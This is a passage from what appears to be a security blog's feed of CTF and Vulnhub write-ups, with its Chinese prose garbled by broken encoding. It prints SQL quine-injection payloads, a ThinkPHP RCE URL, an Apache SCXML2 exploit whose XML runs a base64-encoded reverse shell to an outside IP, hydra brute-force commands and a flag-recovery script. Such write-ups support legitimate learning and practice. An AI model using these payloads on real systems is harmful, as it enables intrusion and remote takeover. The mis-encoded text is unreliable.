href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injectionï¼ˆquineæ³¨å…¥ï¼‰</a></p><p>è¿™å°±æ˜¯åŸé¢˜çš„é¢˜ç›®ï¼Œè¿™é“é¢˜å°±å±äºæ˜¯ç…§æ¬ä¸‹æ¥çš„</p><p><strong>payload1</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯çœ‹è°åšè¿‡è¿™é¢˜æˆ–åˆ™æ˜¯è®°å¾—æ‹¿ç€é¢˜ç›®ç»™çš„wafå»æœï¼Œç„¶åå‘ç°åŸé¢˜</p><p>ç„¶åå°±ç›´æ¥æ‹¿ç€åŸé¢˜ç»™çš„wpç›´æ¥æ‰“å°±è¡Œäº†</p><h2 id="BabyJXvX"><a href="#BabyJXvX" class="headerlink" title="BabyJXvX"></a>BabyJXvX</h2><p><strong>è€ƒç‚¹</strong>     <strong>Apache SCXML2 RCE</strong></p><p><a href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCEåˆ†æ</a></p><p>è¿™é‡Œæˆ‘ä»¬è‡ªå·±æ¥è·Ÿä¸€éè¿™ä¸ªé€»è¾‘ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹</p><p>è¿™é‡ŒçœŸçš„æœäº†ï¼Œæ²¡æœ‰æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ å’‹æ ·å®‰è£…ç¯å¢ƒï¼Œç›´æ¥å»mavenæ‰¾çš„è¯æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œåªèƒ½é€šè¿‡æŠ¥é”™ä¿¡æ¯ä¸€ä¸ªä¸€ä¸ªjaråŒ…ä¸‹è½½ä¸‹æ¥</p><p><strong>è¿™é‡Œæˆ‘ç”¨çš„jdkæ˜¯8</strong>   </p><p><img src="../images/image-20230425142328815.png" alt="image-20230425142328815"></p><p><img src="../images/image-20230425142335239.png" alt="image-20230425142335239"></p><p>å°±æ˜¯å¾—è‡ªå·±ç™¾åº¦å…ˆä¸‹è½½ä¸¤ä¸ªjaråŒ…ï¼Œç„¶åmavenä¸‹è½½ä¸€ä¸ªæ–°çš„jaråŒ…</p><p>ç„¶ååœ¨å­˜åœ¨xmlæ–‡ä»¶çš„ç›®å½•å¼€å¯ä¸€ä¸ªpythonæœåŠ¡å°±å¯ä»¥å¼€å§‹åˆ†æè¿™ä¸ªæ¼æ´äº†</p><p><img src="../images/image-20230425142503857.png" alt="image-20230425142503857"></p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xmlæ–‡ä»¶</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éƒ¨ç½²å®Œåçœ‹æ˜¯å¦èƒ½å¼¹è®¡ç®—å™¨ï¼Œå¼¹ä¸å‡ºçš„è¯å°±æ˜¯è¯´æ˜ç¯å¢ƒæ²¡é…ç½®æˆåŠŸ</p><p><img src="../images/image-20230425142743847.png" alt="image-20230425142743847"></p><p>ç„¶åå°±å¼€å§‹è·Ÿä¸€ä¸‹è¿™ä¸ªï¼Œçœ‹æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ª</p><h3 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h3><p><img src="../images/image-20230425142927413.png" alt="image-20230425142927413"></p><p>å…ˆç»™æ–­ç‚¹</p><p><img src="../images/image-20230425142945860.png" alt="image-20230425142945860"></p><p>å…ˆè·Ÿåˆ°äº†readæ–¹æ³•è¿™é‡Œ</p><p>è¿›å…¥readæ–¹æ³•ï¼Œåˆè°ƒç”¨äº†å¦ä¸€ä¸ªå‚æ•°ä¸åŒçš„readï¼Œåœ¨è¿™é‡Œä¼ å…¥æˆ‘ä»¬xmlçš„pathï¼Œå¹¶ä¸”åˆå§‹åŒ–äº†ä¸€ä¸ªConfiguration</p><p><img src="../images/image-20230425143202243.png" alt="image-20230425143202243"></p><p>å°†XMLçš„è·¯å¾„å’Œé…ç½®ç±»éƒ½ä¼ å…¥readInternalæ–¹æ³•é‡Œï¼Œè·Ÿè¿›</p><p><img src="../images/image-20230425143352387.png" alt="image-20230425143352387"></p><p><img src="../images/image-20230425143552489.png" alt="image-20230425143552489"></p><p>ç„¶ååˆå§‹åŒ–äº†ä¸€ä¸ªURLresovlerå»è¯»å–XMLï¼Œè¿™è¾¹å’±ä»¬çš„httpæœåŠ¡å°±ä¼šæ¥æ”¶åˆ°å¯¹åº”çš„è¯·æ±‚ï¼Œæœ€åè¿›å…¥readDocumentæ–¹æ³•è¿›è¡Œä¸‹ä¸€æ­¥è¯»å–</p><p><img src="../images/image-20230425143821934.png" alt="image-20230425143821934"></p><p><img src="../images/image-20230425144145979.png" alt="image-20230425144145979"></p><p>å‰é¢çš„å®ä¾‹åŒ–å¯¹è±¡å°±æ²¡æˆªå±ï¼Œåªæˆªçš„æ˜¯å…³é”®éƒ¨åˆ†</p><p><img src="../images/image-20230425144408313.png" alt="image-20230425144408313"></p><p>è·å–xmlçš„namespaceå’Œlocalnameï¼Œæœ€åè¿›å…¥readSCXMLæ–¹æ³•ä¸­è¿›è¡Œæ›´æ·±æ¬¡çš„è¯»å–</p><p>ï¼Œè¿™é‡Œå°±æ˜¯é‡ç‚¹äº†</p><p><img src="../images/image-20230425144705224.png" alt="image-20230425144705224"></p><p>è¿›å…¥readSCXMLåï¼Œç„¶åæ¥ç€è¿›å…¥readstate</p><p><img src="../images/image-20230425144903304.png" alt="image-20230425144903304"></p><p>è¿™é‡Œä¼šè·å–å‡ ä¸ªæ ‡ç­¾ï¼Œå¯ä»¥çœ‹åˆ°åŒ…æ‹¬æˆ‘ä»¬payloadé‡Œçš„stateæ ‡ç­¾ï¼Œç”±äºæœ€å¤–å±‚æ˜¯stateï¼Œå› æ­¤è¿›å…¥readstateæ–¹æ³•     </p><p><img src="../images/image-20230425145318146.png" alt="image-20230425145318146"></p><p>ç¬¬äºŒå±‚æ ‡ç­¾æ˜¯onentryï¼Œæ‰€ä»¥è¿›å…¥äº†readOnEntryæ–¹æ³•</p><p><img src="../images/image-20230425145420093.png" alt="image-20230425145420093"></p><p><img src="../images/image-20230425145447949.png" alt="image-20230425145447949"></p><p>è¿›å…¥readExecutableContextæ–¹æ³•ï¼Œæ¥ä¸‹æ¥ä¹Ÿæ˜¯é‡ç‚¹</p><p><img src="../images/image-20230425145549908.png" alt="image-20230425145549908"></p><p>ç¬¬ä¸‰å±‚æ˜¯scriptï¼Œæ‰€ä»¥è¯»å–scriptæ ‡ç­¾</p><p><img src="../images/image-20230425145700622.png" alt="image-20230425145700622"></p><p><img src="../images/image-20230425145718355.png" alt="image-20230425145718355"></p><p>è·Ÿè¿›readscript</p><p><img src="../images/image-20230425145741954.png" alt="image-20230425145741954"></p><p><strong>å¤ªèœäº†ï¼Œè·Ÿä¸ä¸‹å»äº†ï¼Œè¿˜æ˜¯å»çœ‹ä¸Šé¢çš„å¤ç°æ–‡ç« å§ï¼Œé‚£æ ·å¥½ä¸€ç‚¹</strong></p><p><img src="../images/image-20230425151120132.png" alt="image-20230425151120132"></p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åšæ³•</strong></p><p><img src="../images/image-20230425154307051.png" alt="image-20230425154307051"></p><p><img src="../images/image-20230425154316949.png" alt="image-20230425154316949"></p><p>è¿™é‡Œå…ˆæ˜¯åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ ï¼Œç„¶åå¼€å¯ç«¯å£ç›‘å¬å°±è¡Œäº†</p><p><img src="../images/image-20230425154410279.png" alt="image-20230425154410279"></p><p><a href="https://www.xaitx.com/1936.html">è¯¦ç»†wp</a></p><p><strong>æ ¹æ®å½“æ—¶æƒ…å†µä¸€æ­¥ä¸€æ­¥çš„åˆ†æå‡ºæ¥çš„</strong></p><h2 id="HDCTF-2023-JavaMonster"><a href="#HDCTF-2023-JavaMonster" class="headerlink" title="[HDCTF 2023]JavaMonster]"></a>[HDCTF 2023]JavaMonster]</h2><p>è€ƒç‚¹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;è¿™é‡Œçš„è¯æ˜¯åªè®°å½•è‡ªå·±ä¸ä¼šçš„çŸ¥è¯†ç‚¹&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;HDCTF-2023-YamiYami&quot;&gt;&lt;a href=&quot;#HDCTF-2023-YamiYami&quot; class=&quot;headerlink&quot; title=&quot;[HDCTF 2023]Y</summary>
      
    
    
    
    
    <category term="HDCTF WEB 2023" scheme="https://ke1nys.github.io/tags/HDCTF-WEB-2023/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF-su-web-wp</title>
    <link href="https://ke1nys.github.io/posts/d03af1eb.html"/>
    <id>https://ke1nys.github.io/posts/d03af1eb.html</id>
    <published>2023-04-22T12:23:09.000Z</published>
    <updated>2023-04-26T13:05:32.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ã€å›°éš¾ã€‘pdf-converter"><a href="#ã€å›°éš¾ã€‘pdf-converter" class="headerlink" title="ã€å›°éš¾ã€‘pdf_converter"></a>ã€å›°éš¾ã€‘pdf_converter</h2><p>è¿™é¢˜æ˜¯éé¢„æœŸè§£åšå‡ºæ¥çš„ï¼Œå°±æ˜¯ç›´æ¥æ‰“thinkphpæ¨¡æ¿æ¼æ´</p><p><img src="../images/image-20230422202503164.png" alt="image-20230422202503164"></p><p>å‘ç°ç‰ˆæœ¬</p><p><img src="../images/image-20230422202543023.png" alt="image-20230422202543023"></p><p>æ‰¾åˆ°æ¼æ´åˆ©ç”¨ç‚¹</p><p><img src="../images/image-20230422202620649.png" alt="image-20230422202620649"></p><p>ç„¶åç›´æ¥ç½‘ä¸Šæ‰¾payloadç›´æ¥æ‰“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=å‘½ä»¤å‚æ•°</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230422202707601.png" alt="image-20230422202707601"></p><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>ç»™äº†ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç›´æ¥åç¼–è¯‘æˆpycæ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°è¿™æ˜¯ç”¨3.11ç¼–å†™çš„ï¼Œæ‰€ä»¥uncompyle6ç”¨ä¸äº†ï¼Œé‚£å°±åªèƒ½ä½¿ç”¨pycdcæ¥çœ‹å­—èŠ‚ç (å¦‚ä¸‹)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">[Constants]</span><br><span class="line">        0</span><br><span class="line">        None</span><br><span class="line">        322376503</span><br><span class="line">        &#x27;Enter your flag: &#x27;</span><br><span class="line">        b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        255</span><br><span class="line">        &#x27;Correct!&#x27;</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       RESUME                        0</span><br><span class="line">        2       LOAD_CONST                    0: 0</span><br><span class="line">        4       LOAD_CONST                    1: None</span><br><span class="line">        6       IMPORT_NAME                   0: random</span><br><span class="line">        8       STORE_NAME                    0: random</span><br><span class="line">        10      PUSH_NULL                     </span><br><span class="line">        12      LOAD_NAME                     0: random</span><br><span class="line">        14      LOAD_ATTR                     1: Random</span><br><span class="line">        24      LOAD_CONST                    2: 322376503</span><br><span class="line">        26      PRECALL                       1</span><br><span class="line">        30      CALL                          1</span><br><span class="line">        40      STORE_NAME                    2: r</span><br><span class="line">        42      PUSH_NULL                     </span><br><span class="line">        44      LOAD_NAME                     3: input</span><br><span class="line">        46      LOAD_CONST                    3: &#x27;Enter your flag: &#x27;</span><br><span class="line">        48      PRECALL                       1</span><br><span class="line">        52      CALL                          1</span><br><span class="line">        62      LOAD_METHOD                   4: encode</span><br><span class="line">        84      PRECALL                       0</span><br><span class="line">        88      CALL                          0</span><br><span class="line">        98      STORE_NAME                    5: pt</span><br><span class="line">        100     LOAD_CONST                    4: b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        102     STORE_NAME                    6: ct</span><br><span class="line">        104     BUILD_LIST                    0</span><br><span class="line">        106     STORE_NAME                    7: buf</span><br><span class="line">        108     LOAD_NAME                     5: pt</span><br><span class="line">        110     GET_ITER                      </span><br><span class="line">        112     FOR_ITER                      46 (to 206)</span><br><span class="line">        114     STORE_NAME                    8: b</span><br><span class="line">        116     LOAD_NAME                     7: buf</span><br><span class="line">        118     LOAD_METHOD                   9: append</span><br><span class="line">        140     LOAD_NAME                     2: r</span><br><span class="line">        142     LOAD_METHOD                   10: randint</span><br><span class="line">        164     LOAD_CONST                    0: 0</span><br><span class="line">        166     LOAD_CONST                    5: 255</span><br><span class="line">        168     PRECALL                       2</span><br><span class="line">        172     CALL                          2</span><br><span class="line">        182     LOAD_NAME                     8: b</span><br><span class="line">        184     BINARY_OP                     12</span><br><span class="line">        188     PRECALL                       1</span><br><span class="line">        192     CALL                          1</span><br><span class="line">        202     POP_TOP                       </span><br><span class="line">        204     JUMP_BACKWARD                 47</span><br><span class="line">        206     PUSH_NULL                     </span><br><span class="line">        208     LOAD_NAME                     11: bytes</span><br><span class="line">        210     LOAD_NAME                     7: buf</span><br><span class="line">        212     PRECALL                       1</span><br><span class="line">        216     CALL                          1</span><br><span class="line">        226     LOAD_NAME                     6: ct</span><br><span class="line">        228     COMPARE_OP                    2 (==)</span><br><span class="line">        234     POP_JUMP_FORWARD_IF_TRUE      2</span><br><span class="line">        236     LOAD_ASSERTION_ERROR          </span><br><span class="line">        238     RAISE_VARARGS                 1</span><br><span class="line">        240     PUSH_NULL                     </span><br><span class="line">        242     LOAD_NAME                     12: print</span><br><span class="line">        244     LOAD_CONST                    6: &#x27;Correct!&#x27;</span><br><span class="line">        246     PRECALL                       1</span><br><span class="line">        250     CALL                          1</span><br><span class="line">        260     POP_TOP                       </span><br><span class="line">        262     LOAD_CONST                    1: None</span><br><span class="line">        264     RETURN_VALUE                  </span><br></pre></td></tr></table></figure><p>ç†è§£ä¸€ä¸‹å°±æ˜¯ä»¥ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line"></span><br><span class="line">pt = input(&#x27;Enter your flag: &#x27;).encode()</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line"></span><br><span class="line">buf = []</span><br><span class="line">for b in pt:</span><br><span class="line">    buf.append((r.randint(0, 255) ^ b))</span><br><span class="line"></span><br><span class="line">if bytes(buf) == ct:</span><br><span class="line">    print(&quot;Correct!&quot;)</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å†™å‡ºè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">enc = []</span><br><span class="line">for i in ct:</span><br><span class="line">    enc.append(i)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    flag += chr(r.randint(0, 255) ^ enc[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ã€å›°éš¾ã€‘pdf-converter&quot;&gt;&lt;a href=&quot;#ã€å›°éš¾ã€‘pdf-converter&quot; class=&quot;headerlink&quot; title=&quot;ã€å›°éš¾ã€‘pdf_converter&quot;&gt;&lt;/a&gt;ã€å›°éš¾ã€‘pdf_converter&lt;/h2&gt;&lt;p&gt;è¿™é¢˜æ˜¯éé¢„æœŸè§£åšå‡ºæ¥</summary>
      
    
    
    
    
    <category term="DASCTF web SU" scheme="https://ke1nys.github.io/tags/DASCTF-web-SU/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-4</title>
    <link href="https://ke1nys.github.io/posts/f7456a24.html"/>
    <id>https://ke1nys.github.io/posts/f7456a24.html</id>
    <published>2023-04-21T12:01:22.000Z</published>
    <updated>2023-04-27T12:31:51.148Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºåœ°å€</p><p><img src="../images/image-20230427145027282.png" alt="image-20230427145027282"></p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230427145130880.png" alt="image-20230427145130880"></p><p>å¼€äº†ä¸‰ä¸ªç«¯å£  å…ˆå°è¯•çœ‹èƒ½å¦è¿›è¡Œftpç™»å½•</p><p><img src="../images/image-20230427145314408.png" alt="image-20230427145314408"></p><p>å‘ç°ä¸è¡Œï¼Œä¸èƒ½åŒ¿åç™»å½•</p><p>äºæ˜¯æŸ¥çœ‹ä¸€ä¸‹80ç«¯å£</p><p><img src="../images/image-20230427145452523.png" alt="image-20230427145452523"></p><p>å‘ç°æºç å­˜åœ¨ä¸€æ®µbase64åŠ å¯†çš„å¯†æ–‡ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè§£å¯†â€˜</p><p><img src="../images/image-20230427145606070.png" alt="image-20230427145606070"></p><p>æœ€åè§£å¯†çš„åˆ°è¿™ä¸ªè·¯å¾„  ç„¶åè¿›è¡Œè®¿é—®Â·Â·</p><p><img src="../images/image-20230427145659695.png" alt="image-20230427145659695"></p><p>è®¿é—®å¾—åˆ°ä»¥ä¸‹çš„ä¸€äº›ç¬¦å·ï¼Œäºæ˜¯è¿›è¡Œè§£å¯†</p><p><img src="../images/image-20230427145930036.png" alt="image-20230427145930036"></p><p><img src="../images/image-20230427150000913.png" alt="image-20230427150000913"></p><p>åˆ©ç”¨ä¸Šé¢çš„åœ¨çº¿ç½‘å€è¿›è¡Œè§£å¯†ï¼Œå‘ç°å­˜åœ¨è¿™ä¸ªä¸€ä¸ªå›¾ç‰‡è·¯å¾„  <code>/iTiS3Cr3TbiTCh.png</code></p><p><img src="../images/image-20230427150102540.png" alt="image-20230427150102540"></p><p>è®¿é—®ä¹‹åå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œå¾—åˆ°ä»¥ä¸‹çš„ä¿¡æ¯</p><p><img src="../images/image-20230427193142028.png" alt="image-20230427193142028"></p><p>äºæ˜¯çŒœæµ‹è¿™å‡ ä¸ªæ˜¯ç”¨æˆ·åï¼Œäºæ˜¯å°è¯•è¿›è¡Œsshçˆ†ç ´è¯•è¯•ï¼Œå…ˆå°†è¿™å‡ ä¸ªç”¨æˆ·åä¿å­˜ä¸ºuser1.txt</p><p><img src="../images/image-20230427193338239.png" alt="image-20230427193338239"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.146</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427193516063.png" alt="image-20230427193516063"></p><p>çˆ†ç ´å¤±è´¥ï¼Œæ²¡æœ‰åŒ¹é…çš„å¯†ç </p><p>äºæ˜¯å°±å°è¯•çˆ†ç ´ä¸€ä¸‹ftp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt 